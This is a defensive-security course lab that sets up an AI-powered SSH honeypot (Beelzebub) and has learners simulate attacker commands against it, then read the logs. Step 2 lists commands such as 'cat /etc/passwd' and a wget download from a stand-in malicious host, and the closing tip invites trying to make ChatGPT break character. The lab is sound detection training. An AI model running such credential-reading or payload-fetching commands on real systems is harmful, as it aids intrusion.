![image](/FilesForLabs/images/blueantisyphon.png)

---

This is a lab from **John Strand**'s **Active Defense and Cyber Deception** Course:

https://www.antisyphontraining.com/product/active-defense-and-cyber-deception-with-john-strand/

---

# Beelzebub

#### Ubuntu VM

Beelzebub is an advanced honeypot framework designed to provide a highly secure environment for detecting and analyzing cyber attacks. It offers a low code approach for easy implementation and uses AI to mimic the behavior of a high-interaction honeypot

>[!IMPORTANT]
>
>You can find the original GitHub of at [Beelzebub Repo](https://github.com/mariocandela/beelzebub)

<hr>

## Step 1: Setup
### Get the ChatGPT Api Key
- Go to [ChatGPT](https://chatgpt.com/) and create an account if you don’t have one
- Make sure you have credits or a payment method at [Billing Setting](https://platform.openai.com/settings/organization/billing/overview)
- Go to [API Keys](https://platform.openai.com/api-keys) and create a new key
- Save this key as you will only see it once!

<br>

### Deployment
Make sure you are into **~/ADCD/beelzebub/**

```bash
cd ~/ADCD/beelzebub/
```

```bash
nano docker-compose.yml
```
Put your key here at `OPEN_AI_SECRET_KEY: `

<img width="334" height="72" alt="2026-04-03_15-49" src="https://github.com/user-attachments/assets/c04fdc85-78f3-4e5c-81f2-bca9ad0e329f" />

Also comment the **Default SSH Mapping**(ssh 22 port) by putting a `#` anywhere before it in the same line

<img width="270" height="114" alt="2026-04-03_15-56" src="https://github.com/user-attachments/assets/d0f49b7c-1c5f-4e11-bbd1-26c340c58e70" />

Save and leave the editor with `Ctrl + X` + `Y` + `Enter`

```bash
cd configurations/services/
```
```bash
mv ./ssh-22.yaml ~
```
```bash
nano ./ssh-2222.yaml
```
Add your key with double quotes around it like `openAISecretKey: "your_api_key_here"`

![2026-04-03_15-59](https://github.com/user-attachments/assets/461c4622-063b-474d-83de-5a1c45a88fb2)

Save and leave the editor with `Ctrl + X` + `Y` + `Enter`

```bash
cd ~/ADCD/beelzebub/
```
```bash
sudo docker-compose build
```
```bash
sudo docker-compose up -d
```

<hr>

## Step 2: Try it
Connect to it like this:

```bash
ssh -p 2222 root@127.0.0.1
``` 
Use password "**1234**"

Try using any commands like **ls** or **id**

<img width="1242" height="259" alt="2026-04-03_16-11" src="https://github.com/user-attachments/assets/f9849ffe-c7b6-494e-b48c-8119837935c3" />

Everything you see is AI generated, and that's what an attacker would see

Cool, right?

Try running suspicious commands an attacker would use:

```bash
uname -a
```
```bash
cat /etc/passwd
```
```bash
wget http://malicious.example/malware.sh
```
```bash
id
```
Now exit the session by typing **exit** and hitting **enter** to export the logs

<hr>

## Step 3: Analyzing The Logs

First, save the logs:

```bash
sudo docker-compose logs > honeypot.log
```

Then, stop **Beelzebub**:

```bash
sudo docker stop beelzebub
```

Now, it's time to read the logs:

```bash
cat honeypot.log
```

Take your time into analyzing the logs and seeing how they are being built

>[!TIP]
>
>Try to make ChatGPT break character, this method, like anything else in cybersecurity isn't flawless, but it surely tricks hackers and does its job, **to increase Attack Time**